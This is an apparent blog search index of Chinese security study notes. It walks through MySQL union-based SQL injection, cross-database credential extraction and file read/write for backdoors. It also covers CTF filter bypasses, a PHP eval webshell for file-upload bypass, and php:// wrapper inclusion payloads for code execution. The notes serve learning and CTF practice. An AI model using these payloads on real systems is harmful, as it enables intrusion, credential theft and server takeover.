<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>SQL注入--MYSQL数据库注入</title>
    <url>/2023/09/21/MYSQLinjection/</url>
    <content><![CDATA[<h2 id="SQL注入学习笔记（二）–MYSQL数据库注入之数据注入"><a href="#SQL注入学习笔记（二）–MYSQL数据库注入之数据注入" class="headerlink" title="SQL注入学习笔记（二）–MYSQL数据库注入之数据注入"></a>SQL注入学习笔记（二）–MYSQL数据库注入之数据注入</h2><h3 id="MYSQL数据库结构–注意！！！这是MYSQL数据库的注入"><a href="#MYSQL数据库结构–注意！！！这是MYSQL数据库的注入" class="headerlink" title="MYSQL数据库结构–注意！！！这是MYSQL数据库的注入"></a>MYSQL数据库结构–注意！！！这是MYSQL数据库的注入</h3><p>MYSQL数据库结构–step by step get 权限<br> 数据库A&#x3D;网站A(first step)&#x3D;数据库普通用户A(若为root最高权限用户，可实现跨库)<br>  表名(second)<br>   列名(third)<br>    数据(dourth)<br> 数据库B&#x3D;网站B&#x3D;数据库普通用户A<br>  表名<br>   列名<br>    数据<br> 数据库C&#x3D;网站C&#x3D;数据库普通用户A<br>  表名<br>   列名<br>    数据<br>数据库A&#x3D;网站A&#x3D;数据库用户A	——&gt;表名——&gt;列名——&gt;数据<br>数据库B&#x3D;网站B&#x3D;数据库用户B	——&gt;表名——&gt;列名——&gt;数据<br>数据库C&#x3D;网站C&#x3D;数据库用户C	——&gt;表名——&gt;列名——&gt;数据<br>备注：这样的好处一个用户对应一个库、这样网站之间的数据互不干扰，<br>当然这是最基础的数据库模型，现在大网站都是分布式数据库。</p>
<h3 id="信息收集–便于后期选择何种方式进行数据注入或者高权限注入"><a href="#信息收集–便于后期选择何种方式进行数据注入或者高权限注入" class="headerlink" title="信息收集–便于后期选择何种方式进行数据注入或者高权限注入"></a>信息收集–便于后期选择何种方式进行数据注入或者高权限注入</h3><p>数据库版本：version()–方便在进行下面的数据注入1时选择何种方式注入<br>数据库名字：database()–判断是否为高权限<br>数据库用户：user()–管理员<br>操作系统：@@version_compile_os–linux与Windows，哪个分大小写<br>其他(网站路径等)</p>
<h3 id="数据注入"><a href="#数据注入" class="headerlink" title="数据注入"></a>数据注入</h3><p>同数据库：<br>低版本（5.0以下）：暴力查询或结合读取查询<br>高版本（5.0以上）：information_schema有据查询</p>
<h3 id="MYSQL数据库数据注入流程"><a href="#MYSQL数据库数据注入流程" class="headerlink" title="MYSQL数据库数据注入流程"></a>MYSQL数据库数据注入流程</h3><p>1、判断注入<br>2、猜解列名数量（字段数）–order by number(报错的前一个就为列数，order by number中,number是以第number列为参考进行排序)。<br>3、报错猜解准备：<br>根据2得到的列数，</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">www</span>.xiaodi8.com/index.php?id=<span class="number">8</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>--为了看哪些参数能够显示在页面上。</span><br></pre></td></tr></table></figure>
<p>然后让他报错，即在网页页面仅仅显示一个数字(1，2，3，4的任一个),执行：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">www.xiaodi8.com/index.php?<span class="attribute">id</span>=-8 <span class="keyword">and</span> <span class="attribute">2</span>=222 union select 1,2,3,4;--and <span class="attribute">2</span>=222写不写无所谓。</span><br><span class="line">(<span class="attribute">id</span>=-8 是为了让回显的结果为空执行后面union的字句。)</span><br></pre></td></tr></table></figure>
<p>4、信息收集：<br>由于3，为什么要报错：这样就可以在页面看到显示的那个数字，比如说在页面看到2、3，那就在2，3作为参数修改的位置。<br>然后执行：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">www</span>.xiaodi8.com/index.php?id=-<span class="number">8</span> and <span class="number">2</span>=<span class="number">222</span> union select <span class="number">1</span>,version(),database(),<span class="number">4</span>;</span><br></pre></td></tr></table></figure>
<p>这样可以收集到数据库以及版本信息(参数回显)。<br>然后，查询用户以及操作系统:</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">www</span>.xiaodi8.com/index.php?id=-<span class="number">8</span> and <span class="number">2</span>=<span class="number">222</span> union select <span class="number">1</span>,user(),@@version_compile_os,<span class="number">4</span>;</span><br></pre></td></tr></table></figure>

<p>5、开搞：<br>(1)在mysql5.0以后的版本存在一个information_schema数据库、里面存储记录数据库名、表名、列名的数据库<br>相当于可以通过information_schema这个数据库获取到数据库下面的表名和列名。<br>(2)在数据库中，”.”代表下一级，如xiaodi.user代表xiaodi数据库中的user表。<br>(3)相关表名：<br>information_schema.schemata    #记录所有数据库名的表<br>information_schema.tables			#记录所有表名信息的表<br>information_schema.columns		#记录所有列名信息的表<br>table_name										#表名<br>column_name										#列名<br>table_schema&#x2F;schema_name					#数据库名–table_schema是表tables和columns中的字段，schema_name是表schemata下的字段<br>(4)查询信息收集获取到的数据库名下(假设为mozhe)的所有表名信息</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">www.xiaodi8.com/<span class="keyword">index</span>.php?id=<span class="number">-8</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="built_in">table_name</span>),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">&#x27;mozhe&#x27;</span>;(</span><br><span class="line">table_schema是<span class="keyword">tables</span>的一个字段，存储数据库名)</span><br></pre></td></tr></table></figure>
<p>(5)查询通过（4）获取到的表名（假设为color）下的所有列名信息（因为不知道这个表有什么）</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">www.xiaodi8.com/<span class="keyword">index</span>.php?id=<span class="number">-8</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="built_in">column_name</span>),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">&#x27;color&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>(6)此时若获取到列名，id，name，password，现在查询指定数据</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">www.xiaodi8.com/<span class="keyword">index</span>.php?id=<span class="number">-8</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="type">name</span>,<span class="keyword">password</span>,<span class="number">4</span> <span class="keyword">from</span> color;</span><br><span class="line"> 多个猜解：采用<span class="keyword">limit</span> x,<span class="number">1</span><span class="comment">--变动猜解</span></span><br></pre></td></tr></table></figure>
<h3 id="高权限注入"><a href="#高权限注入" class="headerlink" title="高权限注入"></a>高权限注入</h3><p>1、跨库查询(前提是需要高权限)：利用注入进行跨数据库查询.本来是一个数据库对应一个网站对应一个普通用户A，但是如果是root用户，<br>那么这个网站存在漏洞的话，会影响到其他数据库，这就是跨库注入。(就是数据库中ROOT权限高，能访问同数据库下其他网站的数据，<br>如果是普通用户会有权限限制)<br>简述流程：<br>(1)获取所有数据库名:</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">www.xiaodi8.com/<span class="keyword">index</span>.php?id=<span class="number">-8</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="built_in">schema_name</span>),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.schemata;</span><br></pre></td></tr></table></figure>
<p>(2)获取指定数据库名qyysw下的表名:</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">www.xiaodi8.com/<span class="keyword">index</span>.php?id=<span class="number">-8</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="built_in">table_name</span>),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">&#x27;qyysw&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>(3)在指定数据库(qyysw)指定表名(admin)查询列名:</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="built_in">column_name</span>),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> <span class="built_in">schema_name</span>=<span class="string">&#x27;qyysw&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>(4)在指定数据库的指定表查询数据：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,u,p,<span class="number">4</span> <span class="keyword">from</span> qyysw.<span class="keyword">admin</span>;(为什么这里要qyysw.<span class="keyword">admin</span>指定数据库，因为这里是跨库，而上面那里不是跨库<span class="comment">--即跨库查询的时候一定要指定数据库名)</span></span><br></pre></td></tr></table></figure>
<p>2、文件读取：利用注入进行文件读取或写入（前提：知道路径，获取管理员权限）<br>(1)MYSQL数据库内置的两个函数：<br>load_file						文件读取函数<br>into outfile 或into dumpfile		文件写入&#x2F;导出函数<br>(2)文件路径获取方法:报错显示(路径后乱打一通)、遗留文件(找phpinfo.php)、漏洞报错(搭建平台软件漏洞爆路径)、平台配置文件、爆破等。<br>(3)假设知道路径后：<br>读入：<br>?id&#x3D;-8 union select 1,load_file(‘d:\ww.txt’),3,4;(\是防转义,防止\被转换)<br>写入（后门）：<br>?id&#x3D;-8 union select 1,’x(要写入的代码)’,3,4 into outfile ‘D:\PYstart\x.php’ –+(查看网站源代码，若后面有其他SQL语句，注释掉后面的内容);</p>
<h4 id="魔术引号"><a href="#魔术引号" class="headerlink" title="魔术引号"></a>魔术引号</h4><p>关于文件读写，存在一个魔术引号的概念(存在于php5.3.4及其以下的版本)<br>  魔术引号设计的初衷是为了让从数据库或文件中读取数据和从请求中接收参数时，对单引号、双引号、反斜线、NULL加上一个一个反斜线()进行转义，这个的作用跟addslashes()的作用完全相同，一定程度上防止了SQL注入。<br>绕过方法:<br>采用hex(16进制)编码绕过因为对路径进行编码之后魔术引号不会再对其生效也就是说绕过了魔术引号的作用达到绕过。<br>编码软件:winhex、小葵</p>
<h3 id="相关防注入"><a href="#相关防注入" class="headerlink" title="相关防注入"></a>相关防注入</h3><p>1、自带防御:魔术引号<br>2、内置函数：int()等<br>3、自定义关键字:select–可以通过大小写混合(Select)，双写(selselectect)绕过<br>4、WAF防护软件：安全狗、宝塔等<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=12&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">跨库注入演示：15：00处</a><br><a href="https://blog.csdn.net/weixin_30292843/article/details/99381669">文件读取是有讲究的:读取敏感信息</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全（目前）绕过|姿势总结</title>
    <url>/2023/12/13/RaoGuoZJ/</url>
    <content><![CDATA[<p><code>最近疯狂刷题，但是发现效果微乎其微，静下来思考，😔需要沉淀，趁我还记得，我想把一些做题遇到的绕过|思路记录下来</code></p>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="一、正则过滤select等函数"><a href="#一、正则过滤select等函数" class="headerlink" title="一、正则过滤select等函数"></a>一、正则过滤select等函数</h2><figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">preg_match(&quot;/set|<span class="keyword">prepare</span>|<span class="keyword">alter</span>|<span class="keyword">rename</span>|<span class="keyword">select</span>|<span class="keyword">update</span>|<span class="keyword">delete</span>|<span class="keyword">drop</span>|<span class="keyword">insert</span>|<span class="keyword">where</span>|\./i<span class="string">&quot;,$inject);</span></span><br></pre></td></tr></table></figure>
<h3 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h3><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p>爆库</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;;<span class="keyword">show</span> databases;<span class="meta">#</span></span><br></pre></td></tr></table></figure>
<p>爆表</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;;<span class="keyword">show</span> tables;<span class="meta">#</span></span><br></pre></td></tr></table></figure>
<p>爆某表的列</p>
<figure class="highlight pf"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;;show columns <span class="keyword">from</span> <span class="built_in">table</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>爆数据（select被过滤情况下失效）</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">1&#x27;</span>;<span class="keyword">select</span> flag <span class="keyword">from</span> table;<span class="meta">#</span></span><br></pre></td></tr></table></figure>
<h4 id="堆叠注入-handler"><a href="#堆叠注入-handler" class="headerlink" title="堆叠注入+handler"></a>堆叠注入+handler</h4><p>前面的操作与上面相同，爆数据时</p>
<figure class="highlight julia"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;;HANDLER <span class="string">`1919810931114514`</span> OPEN;HANDLER <span class="string">`1919810931114514`</span> READ next;HANDLER <span class="string">`1919810931114514`</span> CLOSE;<span class="comment">#</span></span><br><span class="line"><span class="comment">#``包裹的是一个纯数字表名。</span></span><br></pre></td></tr></table></figure>
<h4 id="堆叠注入-alter"><a href="#堆叠注入-alter" class="headerlink" title="堆叠注入+alter"></a>堆叠注入+alter</h4><p>如何alter没有被过滤，爆数据时可以</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;;alter table <span class="built_in">words</span> rename <span class="keyword">to</span> words1;alter table `<span class="number">1919810931114514</span>` rename <span class="keyword">to</span> <span class="built_in">words</span>;alter table <span class="built_in">words</span> change flag <span class="built_in">id</span> varchar(<span class="number">50</span>);<span class="comment">#</span></span><br><span class="line"><span class="comment">#就是猜测原本的sql语句的意思，然后在爆出库名表名列名的基础上，将目标表名列名改成select子句的数据，比如原本的select子句是&#x27;select id from words&#x27;,那我在使用上述sql语句后，在返回登录框使用万能密码便可以直接爆出flag。</span></span><br></pre></td></tr></table></figure>
<h4 id="堆叠注入-预编译"><a href="#堆叠注入-预编译" class="headerlink" title="堆叠注入+预编译"></a>堆叠注入+预编译</h4><p>因为select关键字被过滤了，所以我们可以通过预编译的方式拼接select 关键字：<br>预编译相当于定一个语句相同，参数不同的Mysql模板，我们可以通过预编译的方式，绕过特定的字符过滤,格式：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、<span class="keyword">PREPARE</span> 名称 <span class="keyword">FROM</span> <span class="keyword">Sql</span>语句 ? ;</span><br><span class="line"><span class="number">2</span>、<span class="keyword">SET</span> <span class="variable">@x</span><span class="operator">=</span>xx;</span><br><span class="line"><span class="keyword">EXECUTE</span> 名称 <span class="keyword">USING</span> <span class="variable">@x</span>;</span><br></pre></td></tr></table></figure>
<p>例子:</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">1&#x27;</span>;<span class="function">PREPARE hacker <span class="keyword">from</span> <span class="title">concat</span>(<span class="params"><span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;elect&#x27;</span>, <span class="string">&#x27; * from \`1919810931114514\` &#x27;</span></span>)</span>;EXECUTE  hacker;<span class="meta">#</span></span><br></pre></td></tr></table></figure>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">也可以将select * from \`<span class="number">1919810931114514</span>\`语句进行<span class="number">16</span>进制编码，即：<span class="number">0</span>x73656c656374202a2066726f6d2060313931393831303933313131343531346</span><br><span class="line"><span class="number">1</span>&#x27;;PREPARE ck from 0x<span class="number">7365</span>6c<span class="number">65637420</span>2a<span class="number">206672</span>6f6d<span class="number">20603139313938</span><span class="number">31303933313131</span><span class="number">3435313460</span>;EXECUTE  ck;#</span><br></pre></td></tr></table></figure>
<h4 id="堆叠注入-Mysql预处理"><a href="#堆叠注入-Mysql预处理" class="headerlink" title="堆叠注入+Mysql预处理"></a>堆叠注入+Mysql预处理</h4><p>利用 MySql 预处理<br>使用条件：HANDLER 也被过滤了。<br>在遇到堆叠注入时，如果 select、rename、alter 和 handler 等语句都被过滤的话，我们可以用 MySql 预处理语句配合 concat 拼接来执行 sql 语句拿 flag。</p>
<h4 id="不安全的过滤"><a href="#不安全的过滤" class="headerlink" title="不安全的过滤"></a>不安全的过滤</h4><p>如果对方多此一举，对or存在一个过滤为空的操作，那可以把or插入select等，如</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; unioorn seleorct <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> frorom infoorrmation_schema.columns wherore table_name=&#x27;b4bsql&#x27;#</span><br></pre></td></tr></table></figure>
<h4 id="union查询特性"><a href="#union查询特性" class="headerlink" title="union查询特性"></a>union查询特性</h4><p>如果没过滤select|union，其他全过滤<br><code>利用sqli的特性：当union联合查询不存在的数据时，联合查询就会构造一个虚拟的数据</code><br>联合注入添加临时用户(前提，知道username、password的字段以及位置)</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;</span><span class="meta">#</span></span><br><span class="line"><span class="meta">#admin存在，但这个密码字段不存在，那就成功添加了一个临时用户（password值必须为md5）</span></span><br></pre></td></tr></table></figure>
<h2 id="二、or被过滤"><a href="#二、or被过滤" class="headerlink" title="二、or被过滤"></a>二、or被过滤</h2><h3 id="绕过思路-1"><a href="#绕过思路-1" class="headerlink" title="绕过思路"></a>绕过思路</h3><h4 id="堆叠注入-1"><a href="#堆叠注入-1" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p>爆库</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;;<span class="keyword">show</span> databases;<span class="meta">#</span></span><br></pre></td></tr></table></figure>
<p>爆表</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;;<span class="keyword">show</span> tables;<span class="meta">#</span></span><br></pre></td></tr></table></figure>
<p>爆某表的列</p>
<figure class="highlight pf"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;;show columns <span class="keyword">from</span> <span class="built_in">table</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>爆数据</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">1&#x27;</span>；<span class="keyword">select</span> flag <span class="keyword">from</span> table;<span class="meta">#</span></span><br></pre></td></tr></table></figure>
<h4 id="双写or"><a href="#双写or" class="headerlink" title="双写or"></a>双写or</h4><p>如</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; oorr <span class="number">1</span>=<span class="number">2</span>#</span><br></pre></td></tr></table></figure>
<h2 id="三、空格被过滤"><a href="#三、空格被过滤" class="headerlink" title="三、空格被过滤"></a>三、空格被过滤</h2><h3 id="绕过思路-2"><a href="#绕过思路-2" class="headerlink" title="绕过思路"></a>绕过思路</h3><h4 id="内联注释代替空格"><a href="#内联注释代替空格" class="headerlink" title="内联注释代替空格"></a>内联注释代替空格</h4><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">1&#x27;</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="meta">#</span></span><br></pre></td></tr></table></figure>
<h4 id="代替空格"><a href="#代替空格" class="headerlink" title="()代替空格"></a>()代替空格</h4><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>’<span class="built_in">or</span>(<span class="number">1</span>=<span class="number">1</span>)<span class="built_in">union</span>(select(<span class="number">1</span>),(select(group_concat(column_name))<span class="built_in">from</span>(information_schema.columns)<span class="built_in">where</span>(table_schema=‘web2’)<span class="built_in">and</span>(table_name=‘flag’)),<span class="number">3</span>)#</span><br></pre></td></tr></table></figure>
<h4 id="一堆杂七杂八代替空格"><a href="#一堆杂七杂八代替空格" class="headerlink" title="一堆杂七杂八代替空格"></a>一堆杂七杂八代替空格</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;IFS&#125;,</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">IFS，</span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">20 <span class="comment">## 空格</span></span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">09 <span class="comment">## tab</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">IFS<span class="variable">$9</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">IFS<span class="variable">$1</span></span></span><br></pre></td></tr></table></figure>
<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="绕过思路-3"><a href="#绕过思路-3" class="headerlink" title="绕过思路"></a>绕过思路</h2><h3 id="黑名单正则匹配后缀绕过"><a href="#黑名单正则匹配后缀绕过" class="headerlink" title="黑名单正则匹配后缀绕过"></a>黑名单正则匹配后缀绕过</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ph|htacess/i&quot;</span>, <span class="variable">$extension</span>)) &#123;<span class="regexp">//</span>黑名单正则过滤</span><br><span class="line">        die(<span class="string">&quot;illegal suffix!&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>（1）、垃圾符号<br>就是加入很多符号，企图让其崩。<br>详情：<a href="https://blog.csdn.net/qq_53079406/article/details/123525882">https://blog.csdn.net/qq_53079406/article/details/123525882</a><br>（2）、配置文件+图片马<br>apache的.htaccess<br>php通用的<code>.user.ini</code>。<br><a href="https://www.cnblogs.com/gaonuoqi/p/12337572.html">https://www.cnblogs.com/gaonuoqi/p/12337572.html</a></p>
<h3 id="若检测文件的内容如何绕过"><a href="#若检测文件的内容如何绕过" class="headerlink" title="若检测文件的内容如何绕过"></a>若检测文件的内容如何绕过</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mb_strpos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp_name</span>), <span class="string">&quot;&lt;?&quot;</span>) !== <span class="literal">FALSE</span>) &#123;<span class="comment">//对文件内容进行检测</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;&amp;lt;? in contents!&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>（1）、改用script脚本</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>($_REQUEST[<span class="number">1</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="exif-imagetype函数绕过"><a href="#exif-imagetype函数绕过" class="headerlink" title="exif_imagetype函数绕过"></a>exif_imagetype函数绕过</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="variable">$image_type</span> = exif_imagetype(<span class="variable">$tmp_name</span>);<span class="regexp">//</span>再次对文件的类型进行过滤</span><br><span class="line">   <span class="keyword">if</span> (!<span class="variable">$image_type</span>) &#123;</span><br><span class="line">       die(<span class="string">&quot;exif_imagetype:not image!&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>这里介绍一下exif_imagetype()。</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="meta"># exif_imagetype — 判断一个图像的类型</span></span><br><span class="line"><span class="meta"># 语法</span></span><br><span class="line">exif_imagetype(<span class="built_in">string</span> $filename): <span class="built_in">int</span></span><br><span class="line">$filename 被检查的图像文件名。</span><br><span class="line"><span class="meta"># 返回值：如果发现了恰当的签名则返回一个对应的常量，否则返回 false</span></span><br><span class="line"><span class="meta"># exif_imagetype() 读取一个图像的第一个字节并检查其签名。</span></span><br><span class="line"><span class="meta"># 本函数可用来避免调用其它 exif 函数用到了不支持的文件类型上或和 $_SERVER[<span class="string">&#x27;HTTP_ACCEPT&#x27;</span>] 结合使用来检查浏览器是否可以显示某个指定的图像。</span></span><br></pre></td></tr></table></figure>
<p>（1）、魔术幻术头<br>在文件前添加GIF89a然后上传。</p>
<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="解题-绕过思路"><a href="#解题-绕过思路" class="headerlink" title="解题|绕过思路"></a>解题|绕过思路</h2><p>自我感觉：文件包含这鸟题多和php伪协议相关，建议学习一下php伪协议</p>
<h3 id="file-get-contents函数"><a href="#file-get-contents函数" class="headerlink" title="file_get_contents函数"></a>file_get_contents函数</h3><h4 id="data-text-palin"><a href="#data-text-palin" class="headerlink" title="data:&#x2F;&#x2F;text&#x2F;palin"></a>data:&#x2F;&#x2F;text&#x2F;palin</h4><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">(isset(<span class="variable">$text</span>)</span></span>&amp;&amp;(<span class="built_in">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))</span><br></pre></td></tr></table></figure>
<p>file_get_contents ($text,’r’) 是读取文件的内容，说明我们首先要上传一个文件，并且它的内容还得是”welcome to the zjctf”，我们考虑用 data 协议，data 协议通常是用来执行 PHP 代码，然而我们也可以将内容写入 data 协议中的逗号后面然后让 file_get_contents 函数取读取。<br>payload</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">text</span>=data://<span class="keyword">text</span>/plain,welcome <span class="built_in">to</span> <span class="keyword">the</span> zjctf</span><br><span class="line">或</span><br><span class="line">?<span class="keyword">text</span>=data://<span class="keyword">text</span>/plain;base64,(welcome <span class="built_in">to</span> <span class="keyword">the</span> zjctf)的base64</span><br></pre></td></tr></table></figure>
<h4 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input&#x2F;"></a>php:&#x2F;&#x2F;input&#x2F;</h4><p>其实使用 php:&#x2F;&#x2F;input 也可以实现绕过</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">POST</span> /?text=php://input</span><br><span class="line">xxxx<span class="comment">#为传入的数据或想要执行的代码</span></span><br></pre></td></tr></table></figure>
<p>但是只支持 post，如果是 get，请使用 data:&#x2F;&#x2F;text&#x2F;plain。</p>
<h3 id="include-file-函数"><a href="#include-file-函数" class="headerlink" title="include($file)函数"></a>include($file)函数</h3><h4 id="可以读取文件"><a href="#可以读取文件" class="headerlink" title="可以读取文件"></a>可以读取文件</h4><p>比如</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="meta"><span class="keyword">$file</span>=key.php;</span></span><br><span class="line">include(<span class="symbol">$</span><span class="keyword">file</span>);</span><br></pre></td></tr></table></figure>
<p>就可以</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?filename=php:<span class="regexp">//</span>filter<span class="regexp">/read=convert.base64-encode/</span>resource=key.php</span><br></pre></td></tr></table></figure>
<p>进行读取这个包含的文件。</p>
<h3 id="include-GET-‘filename’-函数"><a href="#include-GET-‘filename’-函数" class="headerlink" title="include($_GET[‘filename’])函数"></a>include($_GET[‘filename’])函数</h3><h4 id="任意代码执行"><a href="#任意代码执行" class="headerlink" title="任意代码执行"></a>任意代码执行</h4><p>存在文件包含：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>那么可以</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?filename=php:<span class="regexp">//i</span>nput</span><br></pre></td></tr></table></figure>
<p>然后post传递要执行的php代码，如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>文件包含配合伪协议实现任意代码|命令执行。</p>
<h1 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h1>]]></content>
      <categories>
        <category>实战练习心得</category>
        <category>发牢骚</category>
      </categories>
      <tags>
        <tag>实战练习心得</tag>
        <tag>道听途说随笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入--除MYSQL数据库(如mongoDB,oracle等)的注入</title>
    <url>/2023/09/23/SQLinjectFourth/</url>
